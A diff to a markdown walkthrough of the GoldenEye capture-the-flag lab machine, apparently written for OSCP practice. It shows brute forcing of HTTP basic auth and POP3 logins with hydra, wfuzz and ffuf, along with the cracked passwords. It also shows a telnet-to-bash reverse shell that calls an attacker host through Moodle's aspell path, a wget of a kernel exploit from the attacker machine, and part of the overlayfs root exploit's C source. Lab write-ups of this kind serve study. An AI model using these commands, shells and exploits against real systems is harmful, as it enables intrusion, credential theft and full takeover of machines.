@@ -17,7 +17,9 @@ Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
 Package listing: from current OS
 
 
-# Keysword
+# Keysword 
+
+hydra pop3s, retrieve mail wiht telnet, auth basic, moodle v 2.2.3
 
 # nmap
 
@@ -134,96 +136,60 @@ InvincibleHack3r
 
 ```
 
+### Bruteforce password .htaccess .htpasswd
 
+```bash
+
+$ wfuzz -c -w users.txt -w passwords.txt --basic FUZZ:FUZ2Z -u http://192.168.56.101/sev-home --hc 401
+# echo -n username:password | base64
+$ ffuf -w upbase64.txt -u http://oscp.local/laudanum/ -H "Authorization: Basic FUZZ" -c  -fc 401
+
+```
 
 # Scan dir
 
 
 Naviagate to /sev-home/ to login
 
-```bash
+```console
 $ dirb  http://192.168.56.101/sev-home/ -u boris:InvincibleHack3r -X .php
-gobuster dir -u http://192.168.56.101/sev-home/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
+$ gobuster dir -u http://192.168.56.101/sev-home/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
+$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://oscp.local/laudanum/FUZZ -e .php,.txt -H "Authorization: Basic YWRtaW46cGFzc3dvcmQ=" -c  -mc 200
 
-$ wfuzz -c -w users.txt -w passwords.txt --basic FUZZ:FUZ2Z -u http://192.168.56.101/sev-home --hc 401
- /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
-********************************************************
-* Wfuzz 3.1.0 - The Web Fuzzer                         *
-********************************************************
-
-Target: http://192.168.56.101/sev-home
-Total requests: 20
-
-=====================================================================
-ID           Response   Lines    Word       Chars       Payload                                                                                                                                         
-=====================================================================
-
-000000008:   301        9 L      28 W       316 Ch      "boris - InvincibleHack3r"
-Total time: 0
-Processed Requests: 20
-Filtered Requests: 19
-Requests/sec.: 0
-
-
-
-└─$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:10:31
-[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.56.101:55006/
-[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-[STATUS] 64.00 tries/min, 128 tries in 00:02h, 94 to do in 00:02h, 16 active
-[55006][pop3] host: 192.168.56.101   login: boris   password: secret1!
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:13:11
-
-
-                        
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ gobuster dir -u http://192.168.56.101 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --username boris --password  InvincibleHack3r -x php,txt
-===============================================================
-Gobuster v3.1.0
-by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
-===============================================================
-[+] Url:                     http://192.168.56.101
-[+] Method:                  GET
-[+] Threads:                 10
-[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
-[+] Negative Status codes:   404
-[+] User Agent:              gobuster/3.1.0
-[+] Auth User:               boris
-[+] Extensions:              php,txt
-[+] Timeout:                 10s
-===============================================================
-2021/04/14 21:56:10 Starting gobuster in directory enumeration mode
-===============================================================
-/server-status        (Status: 403) [Size: 294]
-                                               
-===============================================================
-2021/04/14 22:01:09 Finished
-===============================================================
-
-
-└─$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-14 22:16:07
-[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.56.101:55006/
-[STATUS] 80.00 tries/min, 80 tries in 00:01h, 142 to do in 00:02h, 16 active
-[55006][pop3] host: 192.168.56.101   login: natalya   password: bird
-[STATUS] 111.00 tries/min, 222 tries in 00:02h, 1 to do in 00:01h, 15 active
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-14 22:18:07
-
- 
 ```
 
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ telnet 192.168.56.101 55007
+Nothing 
+
+# Bruteforce mail's server
+
+```console
+
+$ hydra -l boris -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
+...
+[55006][pop3] host: 192.168.56.101   login: boris   password: secret1!
+...
+1 of 1 target successfully completed, 1 valid password found
+
+
+$ hydra -l natalya -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
+...
+[55006][pop3] host: 192.168.56.101   login: natalya   password: bird
+...
+
+```
+## Retrieve mails
+
+    telnet <server> <port>
+    user <username>
+    pass <password>
+    list
+    retr <n>
+
+
+## boris' and nanatalya's mails
+
+```console
+$ telnet 192.168.56.101 55007
 Trying 192.168.56.101...
 Connected to 192.168.56.101.
 Escape character is '^]'.
@@ -291,7 +257,7 @@ quit
 Connection closed by foreign host.
 
 
-└─$ telnet 192.168.56.101 55007
+$ telnet 192.168.56.101 55007
 Trying 192.168.56.101...
 Connected to 192.168.56.101.
 Escape character is '^]'.
@@ -372,22 +338,22 @@ Cheers,
 
 Dr. Doak "The Doctor"
 
+```
+## Dr. Doak's emails
 
+### Doak's password
 
-└─$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
-Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
-
-Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-04-15 07:16:57
-[INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
-[DATA] max 16 tasks per 1 server, overall 16 tasks, 222 login tries (l:1/p:222), ~14 tries per task
-[DATA] attacking pop3s://192.168.56.101:55006/
+```console
+$ hydra -l doak -P /usr/share/wordlists/fasttrack.txt pop3s://192.168.56.101 -s 55006
+...
 [55006][pop3] host: 192.168.56.101   login: doak   password: goat
-1 of 1 target successfully completed, 1 valid password found
-Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-04-15 07:18:43
-       
+...
+```
 
+### Doak's emails
 
-└─$ telnet 192.168.56.101 55007
+```console
+$ telnet 192.168.56.101 55007
 Trying 192.168.56.101...
 Connected to 192.168.56.101.
 Escape character is '^]'.
@@ -432,51 +398,26 @@ Text throughout most web apps within the GoldenEye servers are scanned, so I can
 Something juicy is located here: /dir007key/for-007.jpg
 
 Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
+```
 
 
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ exiftool for-007.jpg  
-ExifTool Version Number         : 12.16
-File Name                       : for-007.jpg
-Directory                       : .
-File Size                       : 15 KiB
-File Modification Date/Time     : 2018:04:25 02:40:02+02:00
-File Access Date/Time           : 2021:04:15 07:26:04+02:00
-File Inode Change Date/Time     : 2021:04:15 07:26:04+02:00
-File Permissions                : rw-r--r--
-File Type                       : JPEG
-File Type Extension             : jpg
-MIME Type                       : image/jpeg
-JFIF Version                    : 1.01
-X Resolution                    : 300
-Y Resolution                    : 300
-Exif Byte Order                 : Big-endian (Motorola, MM)
+## Key for 007
+
+```console
+$ exiftool for-007.jpg  
+...
 Image Description               : eFdpbnRlcjE5OTV4IQ==
-Make                            : GoldenEye
-Resolution Unit                 : inches
-Software                        : linux
-Artist                          : For James
-Y Cb Cr Positioning             : Centered
-Exif Version                    : 0231
-Components Configuration        : Y, Cb, Cr, -
-User Comment                    : For 007
-Flashpix Version                : 0100
-Image Width                     : 313
-Image Height                    : 212
-Encoding Process                : Baseline DCT, Huffman coding
-Bits Per Sample                 : 8
-Color Components                : 3
-Y Cb Cr Sub Sampling            : YCbCr4:4:4 (1 1)
-Image Size                      : 313x212
-Megapixels                      : 0.066
-                                                                                           
-┌──(kali㉿kali)-[~/OSCP/boxes/goldeneye]
-└─$ echo -n 'eFdpbnRlcjE5OTV4IQ==' | base64 -d                                        
+...                                                                                           
+
+$ echo -n 'eFdpbnRlcjE5OTV4IQ==' | base64 -d                                        
 xWinter1995x!
+```
 
+## Exploit  moodle v2.2.3
 
-moodle v 2.2.3
+### Failed with msfconsole
 
+```console
 msf6 exploit(multi/http/moodle_cmd_exec) > show options
 
 Module options (exploit/multi/http/moodle_cmd_exec):
@@ -519,19 +460,20 @@ msf6 exploit(multi/http/moodle_cmd_exec) > run
 [*] Exploit completed, but no session was created.
 msf6 exploit(multi/http/moodle_cmd_exec) > 
 
+```
+### Exploit manualy
 
+We can test with ping command and combine with tcpdump or if command exist ping then ping to kali machine, ...
 
-
+```console
 Site administration --> Plugins --> Text editors --> TinyMCE HTML editor -->  Spell engine : PSpellShell
-Site administration --> Server --> System paths --> Path to aspell : sh -c '(sleep 4062|telnet 192.168.56.1 3333 | /bin/bash | telnet 192.168.56.1 4444 &)'
-
+Site administration --> Server --> System paths --> Path to aspell : 
 sh -c '(sleep 4062|telnet 192.168.56.1 3333 | /bin/bash | telnet 192.168.56.1 4444 &)'
+```
 
-sh -c '/tmp/rev'
-2020
+#### get shell
 
-
-
+```console
 www-data@ubuntu:/tmp$ ls -al /home
 ls -al /home
 total 20
@@ -540,29 +482,22 @@ drwxr-xr-x 22 root    root    4096 Apr 24  2018 ..
 drwxr-xr-x  4 boris   boris   4096 Apr 14 08:33 boris
 drwxr-xr-x  4 doak    doak    4096 Apr 28  2018 doak
 drwxr-xr-x  4 natalya natalya 4096 Apr 28  2018 natalya
+```
 
 
+# Exploit kernel
 
-
+```console
 [+] [CVE-2015-1328] overlayfs
 
    Details: http://seclists.org/oss-sec/2015/q2/717
    Exposure: highly probable
    Tags: [ ubuntu=(12.04|14.04){kernel:3.13.0-(2|3|4|5)*-generic} ],ubuntu=(14.10|15.04){kernel:3.(13|16).0-*-generic}
    Download URL: https://www.exploit-db.com/download/37292
+```
+## get root
 
-www-data@ubuntu:/var/www/html/dir007key$ wget http://192.168.56.1:8888/37292
-wget http://192.168.56.1:8888/37292
---2021-04-14 12:19:43--  http://192.168.56.1:8888/37292
-Connecting to 192.168.56.1:8888... connected.
-HTTP request sent, awaiting response... 200 OK
-Length: 17592 (17K) [application/octet-stream]
-Saving to: '37292'
-
-100%[======================================>] 17,592      --.-K/s   in 0s      
-
-2021-04-14 12:19:43 (289 MB/s) - '37292' saved [17592/17592]
-
+```console
 www-data@ubuntu:/var/www/html/dir007key$ chmod +x 37292
 chmod +x 37292
 www-data@ubuntu:/var/www/html/dir007key$ ./37292
@@ -578,7 +513,6 @@ id
 uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 
-
 # cat .flag.txt
 cat .flag.txt
 Alec told me to place the codes here: 
@@ -588,18 +522,9 @@ Alec told me to place the codes here:
 If you captured this make sure to go here.....
 /006-final/xvf7-flag/
 
-
-
-
-
-
-sh -c '(sleep 4062|telnet 192.168.230.132 4444|while : ; do sh && break; done 2>&1|telnet 192.168.230.132 4444 >/dev/null 2>&1 &)'
-sh -c '(sleep 4062|telnet 192.168.56.1 3333 | /bin/bash | telnet 192.168.56.1 4444 &)'
-
-telnet <attacker_ip> <port1> | /bin/bash | telnet <attacker_ip> <port2>
 ```
 
-
+# Exploit code
 
 ## ofs.c
 
@@ -766,23 +691,18 @@ main(int argc, char **argv)
 uid_t(*_real_getuid) (void);
 char path[128];
 
-uid_t
-getuid(void)
-{
-_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, "getuid");
-readlink("/proc/self/exe", (char *) &path, 128);
-if(geteuid() == 0 && !strcmp(path, "/bin/su")) {
-unlink("/etc/ld.so.preload");unlink("/tmp/ofs-lib.so");
-setresuid(0, 0, 0);
-setresgid(0, 0, 0);
-execle("/bin/sh", "sh", "-i", NULL, NULL);
-}
+uid_t getuid(void) {
+        _real_getuid = (uid_t(*)(void)) dlsym((void *) -1, "getuid");
+        readlink("/proc/self/exe", (char *) &path, 128);
+        if(geteuid() == 0 && !strcmp(path, "/bin/su")) {
+                unlink("/etc/ld.so.preload");
+                unlink("/tmp/ofs-lib.so");
+                setresuid(0, 0, 0);
+                setresgid(0, 0, 0);
+                execle("/bin/sh", "sh", "-i", NULL, NULL);
+        }
     return _real_getuid();
 }
 
 ```
 
-
-# TODO
-
-Add news files on "sev-home" directory then scan it!
